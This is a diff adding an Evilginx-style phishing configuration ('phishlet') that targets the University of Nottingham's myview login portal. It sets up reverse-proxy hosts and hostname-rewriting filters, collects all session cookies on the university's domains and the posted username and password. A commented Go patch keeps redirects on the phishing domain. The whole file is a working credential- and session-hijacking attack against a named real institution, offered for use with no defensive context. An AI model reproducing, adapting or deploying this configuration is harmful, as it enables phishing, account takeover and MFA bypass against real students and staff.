@@ -1,0 +1,88 @@
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'nottingham.ac.uk', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'nottingham.ac.uk', session: true, is_landing: false}
+  - {phish_sub: 'myview', orig_sub: 'myview', domain: 'nottingham.ac.uk', session: true, is_landing: false}
+ 
+
+sub_filters:
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://myview.nottingham.ac.uk:443', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2Fmyview.nottingham.ac.uk:443', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'myview.nottingham.ac.uk:443', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+ 
+  
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+ 
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+ 
+ 
+
+auth_tokens:
+  - domain: '.nottingham.ac.uk'
+    keys: ['.*,regexp']
+  - domain: 'myview.nottingham.ac.uk'
+    keys: ['.*,regexp']
+  - domain: 'www.nottingham.ac.uk'
+    keys: ['.*,regexp']    
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'myview.nottingham.ac.uk'
+  path: '/dashboard/dashboard-ui/index.html#/landing'
+
+# Modify http_proxy.go file from Line 640 with below code.
+
+#// if "Location" header is present, make sure to redirect to the phishing domain
+#			r_url, err := resp.Location()
+#			
+#			if err == nil {
+#				if r_url.Host == "myview.nottingham.ac.uk:443" {
+#					log.Debug("Location Header Detected ... Trying To Replace it")
+#					
+#					if r_host, ok := p.replaceHostWithPhished("myview.nottingham.ac.uk"); ok {
+#						r_url := strings.Replace(r_url.String(), "myview.nottingham.ac.uk", r_host, -1)
+#						log.Debug("Location Header Replaced with : %s", r_url)
+#						resp.Header.Set("location", r_url)
+#					}
+#				}
+#				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+#					r_url.Host = r_host
+#					resp.Header.Set("Location", r_url.String())
+#				}
+#			}
